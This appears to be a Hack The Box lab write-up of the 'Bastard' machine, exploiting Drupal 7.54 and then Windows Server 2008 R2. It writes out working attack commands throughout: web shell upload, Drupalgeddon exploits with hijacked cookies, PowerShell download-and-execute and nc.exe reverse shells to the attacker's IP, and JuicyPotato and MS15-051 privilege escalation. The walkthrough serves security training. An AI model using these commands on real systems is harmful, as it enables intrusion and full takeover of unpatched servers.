---
layout: post
title:  "Bastard Writeup - Hack The Box"
date:   2025-04-08
desc: ""
keywords: "HTB,OSCP,eWPT,Windows,Drupal,SQLi,DrupalCookieHijacking,Drupalgeddon,Sherlock,MS15-051-KB3045171,SeImpersonatePrivilege,Medium"
categories: [HTB]
tags: [HTB,OSCP,eWPT,Windows,Drupal,SQLi,DrupalCookieHijacking,Drupalgeddon,Sherlock,MS15-051-KB3045171,SeImpersonatePrivilege,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I continue my practice in **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**, this time I have chosen the **Bastard** box, with a **Medium** difficulty, which allowed me to exploit using different exploits and I have also taken advantage of it to use a **Github** tool to search for different vectors to escalate privileges. One of the virtues of **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** labs is that there are many ways to compromise them, the only limit is the lack of creativity and imagination that we can impose on ourselves. I enter the platform and spawn the machine and start the lab.

<br /><br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Although the platform already informs me that the lab is deployed, it is always recommended to verify the connectivity with the same, for that with the sending of a simple **ICMP** trace using `ping` and I have full certainty that everything works correctly. With the tool `whichSystem.py` from the **[Hack4u](https://hack4u.io/){:target="_blank"}** community I can check that the Operating System of the machine to be compromised is **Windows** and with `nmap` I extract all the information of the services and their versions that are using the **TCP** protocol (in case I don't find much information, I can also search for those using the **UDP** protocol). In port **80** there is a lot of information, also `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** tools reveal me that the available system is a **Drupal CMS**, I can also access the version of it because I have access to the **CHANGELOG.txt** file, I can think of a couple of ideas to engage the Web server.

```bash
ping -c 1 10.129.78.125
whichSystem.py 10.129.78.125
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.129.78.125 -oG allPorts
nmap -sCV -p80,135,49154 10.129.78.125 -oN targeted
cat targeted
# http-robots.txt, /includes/ /misc/ /modules/ /profiles/ /scripts/ 
# /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
# /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
# /LICENSE.txt /MAINTAINERS.txt

# http://10.129.78.125/CHANGELOG.txt
# Drupal 7.54, 2017-02-01
```

<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have the **Drupal CMS** version, I can search with `searchsploit` in the **[ExploitDB](https://www.exploit-db.com/){:target="_blank"}** database for a specific exploit for that version, but unfortunately there are many for **Metasploit** and others that are not very close to the version. If I expand the search a little I find a very interesting one that allows the **RCE**, but before downloading the exploit I analyze the script and it is based on a **SQLi** and also **[PHP Wrappers](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html?highlight=php%20wrapper#php-wrappers){:target="_blank"}**. I download it and try to run it but I get an error for a missing function, so I just have to find a **[solution for curl_init not defined](https://stackoverflow.com/questions/6382539/call-to-undefined-function-curl-init){:target="_blank"}** and with `apt-get` I install the missing package and I can run the script correctly.

```bash
searchsploit Drupal 7.54
searchsploit Drupal 7
# Drupal 7.x Module Services - Remote Code Execution      :)

searchsploit -x 41564.php
searchsploit -m 41564.php
mv 41564.php drupal_exploit.php
php drupal_exploit.php
# --> PHP Fatal error:  Uncaught Error: Call to undefined function curl_init()

sudo apt-get install php-curl

php drupal_exploit.php
# :) cURL: Could not resolve host: vmweb.lan
```

<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

When I run the exploit I notice that the host it is trying to resolve does not exist, so I must customize the script. The parameter values I have to modify are the **URL** and the path to the **Endpoint**, the latter because it does not exist on the server but doing some guessing I find the indicated path. I also modify the content of the malicious file that is uploaded to the server to obtain an **RCE**, once all the changes are done I run the exploit and it informs me the path where the malicious file is hosted. I can now run some basic **Recon** commands and confirm that the compromised machine is the real one and not a container.

```bash
cat drupal_exploit.php
nvim !$
nvim drupal_exploit.php
php drupal_exploit.php
# :) File written: http://10.129.115.148/oldb0y.php

# http://10.129.115.148/oldb0y.php?cmd=whoami
# view-source:http://10.129.115.148/oldb0y.php?cmd=hostname
# view-source:http://10.129.115.148/oldb0y.php?cmd=ipconfig
```

<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I can execute commands on the target machine, I am going to use one of **[Nishang's scripts](https://github.com/samratashok/nishang){:target="_blank"}** to obtain a **Reverse Shell**, I must customize it first so that when it is downloaded it executes the module in charge of connecting to my attacking machine (this way I perform only one action instead of two when compromising the system). I am also going to use the native `powershell.exe` binary of the system so that the **[generated process is 64bits](https://stackoverflow.com/questions/19055924/how-to-launch-64-bit-powershell-from-32-bit-cmd-exe){:target="_blank"}** and avoid later problems like the execution of possible exploits to **Escalate privileges**. Now I just need to configure a local server with `python`, open port **443** with `nc` to wait for the connection from the target machine, run the command from the browser and I can access the box.

> **Attacker Machine**:

```bash
sudo tcpdump -i tun0 icmp -n

# view-source:http://10.129.115.148/oldb0y.php?cmd=ping%2010.10.14.238

cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 ./PS.ps1
nvim !$
cat !$ | tail -n 2
# Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.238 -Port 443

sudo rlwrap -cAr nc -nlvp 443
python3 -m http.server 80

# view-source:http://10.129.115.148/oldb0y.php?cmd=C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe%20IEX(New-Object%20Net.WebClient).downloadString(%27http://10.10.14.238/PS.ps1%27)
# :)
```

> **Victime Machine**:

```cmd
whoami
hostname
```

<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There are other exploits that allow to automate the whole Web server compromise and get an interactive Shell, with `searchsploit` I find the **[Drupalgeddon2](https://success.trendmicro.com/en-US/solution/KA-0008297){:target="_blank"}** tool that I can download on my attacking machine. After converting the tool to a **Unix** format with `dos2unix` and installing a missing **gem** (since the script is written in **Ruby**) I can now run the exploit successfully and again access the system without resorting to my browser.

> Important Information about the Drupal "Drupalgeddon2" Vulnerability: On March 28, 2018, **Drupal** - one of the world's largest open-source web content management platforms reportedly used by over one million sites - issued a highly critical security advisory (**SA-CORE-2018-002**) which highlights a remote code execution (**RCE**) vulnerability in versions 6, 7, and 8 of the platform, that if left unpatched, could allow a potential unauthenticated attacker to exploit multiple attack vectors on a site and fully compromise it.

> The **[dos2unix](https://ioflood.com/blog/dos2unix-linux-command/){:target="_blank"}** command is a **Linux** utility used to convert text files from **DOS/MAC** format to **Unix** format with the syntax, dos2unix [options] [filename].

> **Attacker Machine**:

```bash
searchsploit drupal 7.
# php/webapps/44449.rb

searchsploit -m php/webapps/44449.rb
mv 44449.rb drupalggedon2.rb
dos2unix drupalggedon2.rb
ruby drupalggedon2.rb

sudo gem install highline
ruby drupalggedon2.rb
ruby drupalggedon2.rb http://10.129.115.148
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There is another tool that allows a **RCE** in a vulnerable **Drupal CMS**, it is the `drupalgeddon3.py` from **[oways](https://github.com/oways/SA-CORE-2018-004/blob/master/drupalgeddon3.py){:target="_blank"}**. I download the exploit on my attacker machine with `wget`, and when running it the exploit needs a session cookie and a **[Node Number](https://drupalcloud.mit.edu/help/frequently-asked-questions-make-basic-content-changes/what-node-id-number){:target="_blank"}**. I can take advantage that the `drupalggedon2.rb` exploit already generated some files with the name and identifier of the cookie I need to perform a **Cookie Hijacking** and create a new cookie in my browser to access the Dashboard as system administrator.

> **[Drupalgeddon 3 - Drupal Remote Code Execution Vulnerability](https://digital.nhs.uk/cyber-alerts/2018/cc-2313){:target="_blank"}**: The vulnerability exists in a **URL** parameter, **“destination”**, which is not sanitized. Attackers can leverage this to execute arbitrary commands on the web server. There are multiple published exploitation examples available on the internet since the patch released. Attackers can also determine if the web site is vulnerable using **Google**.

> **[Node ID number](https://drupalcloud.mit.edu/help/frequently-asked-questions-make-basic-content-changes/what-node-id-number){:target="_blank"}**: In **Drupal**, each unique piece of content, or node, has its own unique **ID** number. Pages are nodes and therefore each page has a unique ID, or node number. One way to address a page is by its node number. For example, the URL for the default home page of your new **Drupal Cloud** site is **http:// sitename.mit.edu/node/1**. Node numbers are assigned to content sequentially.

> **Attacker Machine**:

```bash
cat session.json

wget https://raw.githubusercontent.com/oways/SA-CORE-2018-004/refs/heads/master/drupalgeddon3.py
python2 drupalgeddon3.py
# python drupalgeddon3.py http://target/drupal/ "SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0" 6 "uname -a"
# 6 Exist Node number ?

# http://10.129.115.148/#overlay=admin/content
```

<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I'm in the **Drupal** Dashboard I can look up a valid **Node ID number**, and since I already have session cookie information I can run the `drupalgeddon3.py` exploit to exploit an **RCE**. I perform some basic enumeration commands, then send an **ICMP** trace with `ping` to my attacking machine to capture the requests with `tcpdump` to verify connectivity and finally, this time with `nc.exe` I can send a **Reverse Shell** to, again, compromise the box.

> **Attacker Machine**:

```bash
cat session.json
python2 drupalgeddon3.py http://10.129.115.148 "SESS3eb1dbbf52d2155b11b51607033c4ba2=QMF4TBS2Y0mt1hJyVFXY7QqfLfVWmV80qj1jCHmo7mU" 1 "whoami" 2>/dev/null
python2 drupalgeddon3.py http://10.129.115.148 "SESS3eb1dbbf52d2155b11b51607033c4ba2=QMF4TBS2Y0mt1hJyVFXY7QqfLfVWmV80qj1jCHmo7mU" 1 "ipconfig" 2>/dev/null

sudo tcpdump -i tun0 icmp -n
python2 drupalgeddon3.py http://10.129.115.148 "SESS3eb1dbbf52d2155b11b51607033c4ba2=QMF4TBS2Y0mt1hJyVFXY7QqfLfVWmV80qj1jCHmo7mU" 1 "ping 10.10.14.238" 2>/dev/null
# :)

locate nc.exe | grep usr
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
impacket-smbserver smbFolder $(pwd) -smb2support
sudo rlwrap -cAr nc -nlvp 443
python2 drupalgeddon3.py http://10.129.115.148 "SESS3eb1dbbf52d2155b11b51607033c4ba2=QMF4TBS2Y0mt1hJyVFXY7QqfLfVWmV80qj1jCHmo7mU" 1 '\\10.10.14.238\smbFolder\nc.exe -e cmd 10.10.14.238 443' 2>/dev/null
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With the first enumeration commands a possible attack vector for **Escalate Privilege** emerges, the current compromised account has the **SeImpersonatePrivilige** privilege enabled, which would allow me to use **[ohpe's](https://github.com/ohpe/juicy-potato){:target="_blank"}** `JuicyPotato.exe` tool to compromise the machine. I just need to obtain system information with `systemInfo` to download the indicated executable on attacking machine and transfer it to the target machine with `certutil.exe`. The tool works without problems but when trying to create a malicious account I have a problem with the **CLSID** and I don't have a valid one in the **[ohpe](https://github.com/ohpe/juicy-potato){:target="_blank"}** page, I will have to look for another attack vector.

> **Victime Machine**:

```cmd
whoami /priv
# SeImpersonatePrivilege
whoami /all
systeminfo
# OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/JuicyPotato.exe ./JP.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.238/JP.exe JP.exe
certutil.exe -hashfile .\JP.exe MD5
```

> **Attacker Machine**:

```bash
md5sum JP.exe
```

> **Victime Machine**:

```cmd
.\JP.exe

net user
.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user oldb0y oldb0y123$ /add"
# COM -> recv failed with errr: 10038
```

<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To speed up a bit the search for vulnerabilities in the system I'm going to turn to **[rasta-mouse's Github project](https://github.com/rasta-mouse/Sherlock){:target="_blank"}**, **Sherlock**, which is a **PowerShell** script that focuses on missing patches. To prevent the script from having problems in its execution I am going to migrate to a PowerShell shell first, then I am going to download the script on my attacking machine and customize it so that once I transfer it to the victim machine the module in charge of looking for all the vulnerabilities is executed. Once the script is interpreted it starts displaying a series of Vulnerabilities and also informs me if the machine is vulnerable or not.

> **Sherlock** - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.

> **Attacker Machine**:

```bash
python3 -m http.server 80
sudo rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
start /b powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.238/PS.ps1')
```

> **Attacker Machine**:

```bash
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/refs/heads/master/Sherlock.ps1

cat Sherlock.ps1 | grep function
# function Find-AllVulns {

nvim Sherlock.ps1
cat Sherlock.ps1 | tail -n 2
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.238/Sherlock.ps1')
# MSBulletin : MS10-092
# MSBulletin : MS15-051
# MSBulletin : MS16-032
```

<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

From the first vulnerabilities in the list that are possibly exploitable, I find some exploits but mostly to be used with **Metasploit**, I am lucky and there is one to exploit the **[MS15-051](https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms15-051.md){:target="_blank"}** vulnerability with several executables for different architectures and versions of **Windows Operating Systems**. I just have to download the **[.zip file](https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip){:target="_blank"}** that has all the binaries on my machine, unzip it and look for the one that fits the target machine's system. The following steps to escalate privileges are not very complex to perform, I will configure a local server with impacket-smbserver to make the nc.exe binary available through the SMB protocol, open port 443 on my attacker machine waiting for a remote connection request and finally run the exploit passing as argument the malicious command that allows to send me a Reverse Shell, and I manage to engage the box and the account of the user with maximum privileges.

> **Attacker Machine**:

```bash
7z l MS15-051-KB3045171.zip
unzip MS15-051-KB3045171.zip
impacket-smbserver smbFolder $(pwd) -smb2support
sudo rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
\\10.10.14.238\smbFolder\ms15-051x64.exe "\\10.10.14.238\smbFolder\nc.exe -e cmd 10.10.14.238 443"

whoami
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> It is always nice to finish an **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** box, but the most rewarding experience is to learn new methods, tools that allow me to learn new concepts or to strengthen those that not long ago I could not understand and consequently apply. It is also very beneficial to work and learn in community because they give me a different point of view and find the most appropriate way to compromise a system. I am not going to stop learning so I kill the **Bastard** box and I am already thinking about the next one.

<br /><br />
<img src="{{ site.img_path }}/bastard_writeup/Bastard_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
